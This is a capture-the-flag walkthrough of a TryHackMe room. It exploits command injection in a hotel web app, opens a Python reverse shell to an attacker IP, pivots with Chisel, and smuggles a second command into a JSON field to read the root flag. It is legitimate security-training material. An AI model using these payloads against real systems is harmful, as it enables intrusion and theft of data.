# Day 11 - Infinity Pool
## Room: <https://tryhackme.com/room/hh-infinitypool-5b3548af>

Hello Hackers!

Welcome to Day 11 of the TryHackMe Hacker Holidays 2026 writeups.

The initial clue suggests that something is hidden from normal visitors:

> `Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.`

Checking `robots.txt` revealed two disallowed paths:

```text
User-agent: *
Disallow: /internal/
Disallow: /status
```

Reviewing `app.js` revealed an internal endpoint:

```text
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
```

The `/internal/netcheck` endpoint was vulnerable to command injection. Testing it with:

```text
; whoami
```

returned:

```text
web
ping: usage error: Destination address required
```

We then used a Python reverse shell:

```text
; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.188.174",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

This gave us a shell and allowed us to retrieve the user flag:

> `THM{...}`

Next, we ran `linpeas.sh` to check for privilege escalation opportunities. Several interesting services were running on ports `8080`, `9000`, and `3000`.

We used Chisel to pivot to the internal services.

On the target:

```bash
./chisel_1.11.8_linux_amd64 client 192.168.188.174:8000 R:8080:localhost:8080
```

On Kali:

```bash
chisel server --port 8000 --reverse
```

We then opened `localhost:8080` in the browser and found an Apache site with an `/admin` endpoint.

The internal API on port `3000` exposed configuration details:

```bash
curl -sS localhost:3000/api/config
```

The response revealed the telephony portal credentials:

```text
FreePBXUCPTemplateCreator:St4yN0t1c3d_2026
```

We logged in to the portal on port `8080` using these credentials. After adding the voicemail widget, we obtained the automation key:

```text
cc_auto_7b3f9a1c4e0d2f6a
```

The automation service was running on port `9000`. We used the key to submit a job with command injection:

```bash
curl -sS -X POST http://localhost:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

This retrieved the root flag:

> `THM{...}`

Happy Hacking!
